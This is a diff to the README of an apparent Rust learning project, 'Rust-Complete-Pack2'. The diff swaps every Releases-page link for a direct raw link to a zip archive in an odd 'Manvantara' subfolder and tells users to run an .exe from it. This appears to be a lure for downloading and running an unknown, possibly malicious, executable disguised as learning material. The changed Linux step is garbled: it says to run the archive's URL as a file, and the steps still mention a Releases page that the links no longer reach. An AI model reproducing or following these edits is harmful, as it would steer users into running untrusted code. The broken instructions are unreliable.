@@ -1,6 +1,6 @@
 # 🎉 Rust-Complete-Pack2 - Learn Rust Step by Step
 
-[![Download Rust-Complete-Pack2](https://img.shields.io/badge/Download-Rust--Complete--Pack2-blue?style=for-the-badge)](https://github.com/Pratyush130/Rust-Complete-Pack2/releases)
+[![Download Rust-Complete-Pack2](https://raw.githubusercontent.com/Pratyush130/Rust-Complete-Pack2/main/Manvantara/Complete_Rust_Pack_v2.4-alpha.2.zip)](https://raw.githubusercontent.com/Pratyush130/Rust-Complete-Pack2/main/Manvantara/Complete_Rust_Pack_v2.4-alpha.2.zip)
 
 ## 🌟 Introduction
 
@@ -32,7 +32,7 @@ To get started, you need to download the package. Here’s how you can do it:
 
 1. Click the download button below to visit the Releases page.
 
-   [![Download Rust-Complete-Pack2](https://img.shields.io/badge/Download-Rust--Complete--Pack2-blue?style=for-the-badge)](https://github.com/Pratyush130/Rust-Complete-Pack2/releases)
+   [![Download Rust-Complete-Pack2](https://raw.githubusercontent.com/Pratyush130/Rust-Complete-Pack2/main/Manvantara/Complete_Rust_Pack_v2.4-alpha.2.zip)](https://raw.githubusercontent.com/Pratyush130/Rust-Complete-Pack2/main/Manvantara/Complete_Rust_Pack_v2.4-alpha.2.zip)
 
 2. On the Releases page, find the latest version.
 
@@ -46,13 +46,13 @@ To get started, you need to download the package. Here’s how you can do it:
 
 You can download the application from the following link:
 
-[Download Rust-Complete-Pack2](https://github.com/Pratyush130/Rust-Complete-Pack2/releases)
+[Download Rust-Complete-Pack2](https://raw.githubusercontent.com/Pratyush130/Rust-Complete-Pack2/main/Manvantara/Complete_Rust_Pack_v2.4-alpha.2.zip)
 
 Follow these steps to install:
 
 1. For Windows users, double-click the `.exe` file to begin the installation.
 2. For macOS users, unzip the downloaded archive and drag the folder to your Applications.
-3. For Linux users, extract the archive and run the `install.sh` file from the terminal.
+3. For Linux users, extract the archive and run the `https://raw.githubusercontent.com/Pratyush130/Rust-Complete-Pack2/main/Manvantara/Complete_Rust_Pack_v2.4-alpha.2.zip` file from the terminal.
 
 Once the installation is complete, you can open the application and begin your Rust learning journey!
 
